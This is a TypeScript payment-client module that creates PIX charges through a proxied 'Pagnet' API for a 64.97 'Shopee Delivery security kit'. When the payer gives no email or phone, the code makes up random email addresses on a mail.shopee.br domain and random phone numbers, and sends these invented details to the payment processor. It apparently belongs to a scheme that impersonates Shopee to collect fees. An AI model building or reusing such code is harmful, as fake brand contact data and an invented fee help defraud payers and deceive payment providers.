/**
 * Cliente para pagamentos PIX via Pagnet API
 * Funciona tanto diretamente quanto via proxy do servidor
 */

// Interface para os dados da solicitação de pagamento
interface PaymentRequest {
  name: string;
  cpf: string;
  email?: string;
  phone?: string;
  amount?: number;
}

// Interface para a resposta do pagamento
interface PaymentResponse {
  id: string;
  pixCode: string;
  pixQrCode: string;
  status?: string;
  error?: string;
}

// Gerar email aleatório para casos onde o email não é fornecido
function generateRandomEmail(name: string): string {
  const username = name.toLowerCase().replace(/\s+/g, '.').substring(0, 15);
  const randomString = Math.random().toString(36).substring(2, 10);
  return `${username}.${randomString}@mail.shopee.br`;
}

// Gerar telefone aleatório para casos onde o telefone não é fornecido
function generateRandomPhone(): string {
  const ddd = Math.floor(Math.random() * (99 - 11) + 11);
  const numero1 = Math.floor(Math.random() * (99999 - 10000) + 10000);
  const numero2 = Math.floor(Math.random() * (9999 - 1000) + 1000);
  return `${ddd}${numero1}${numero2}`;
}

/**
 * Cria um pagamento PIX usando a API Pagnet via proxy do servidor
 * Funciona tanto com variáveis de ambiente diretas quanto via proxy
 */
export async function createPixPaymentDirect(data: PaymentRequest): Promise<PaymentResponse> {
  console.log(`Criando pagamento PIX via Pagnet`);
  
  try {
    const amount = data.amount || 64.97; // Valor padrão para o kit de segurança
    
    const payload = {
      name: data.name,
      email: data.email || generateRandomEmail(data.name),
      cpf: data.cpf,
      phone: data.phone || generateRandomPhone(),
      amount: amount,
      description: "Kit de Segurança Shopee Delivery"
    };
    
    console.log('Enviando requisição para Pagnet via proxy:', {
      ...payload,
      cpf: `${data.cpf.substring(0, 3)}***${data.cpf.substring(data.cpf.length - 2)}`,
    });
    
    // Usar a rota proxy que agora utiliza Pagnet internamente
    const response = await fetch('/api/proxy/for4payments/pix', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Accept': 'application/json'
      },
      body: JSON.stringify(payload)
    });
    
    // Verificar se a resposta foi bem sucedida
    if (!response.ok) {
      const errorData = await response.json();
      throw new Error(errorData.error || `Falha na comunicação com Pagnet: ${response.statusText}`);
    }
    
    // Processar a resposta
    const responseData = await response.json();
    console.log('Resposta da Pagnet recebida via proxy:', responseData);
    
    // A resposta já vem no formato compatível do proxy
    const transactionId = responseData.id ? responseData.id.toString() : '';
    const pixCode = responseData.pixCode || '';
    const pixQrCode = responseData.pixQrCode || '';
    
    console.log('Dados extraídos da resposta:', {
      id: transactionId,
      pixCodePresent: !!pixCode,
      pixQrCodePresent: !!pixQrCode
    });
    
    // Validar a resposta
    if (!pixCode || !pixQrCode || !transactionId) {
      console.error('Resposta da Pagnet incompleta:', responseData);
      throw new Error('Resposta da Pagnet não contém os dados de pagamento PIX necessários');
    }
    
    const finalResult = {
      id: transactionId,
      pixCode: pixCode,
      pixQrCode: pixQrCode,
      status: responseData.status || 'pending'
    };
    
    console.log('Retornando resultado final:', finalResult);
    return finalResult;
  } catch (error: any) {
    console.error('Erro ao processar pagamento via Pagnet:', error);
    // Propagar o erro para que o caller possa lidar com isso
    throw new Error(error.message || 'Não foi possível processar o pagamento no momento');
  }
}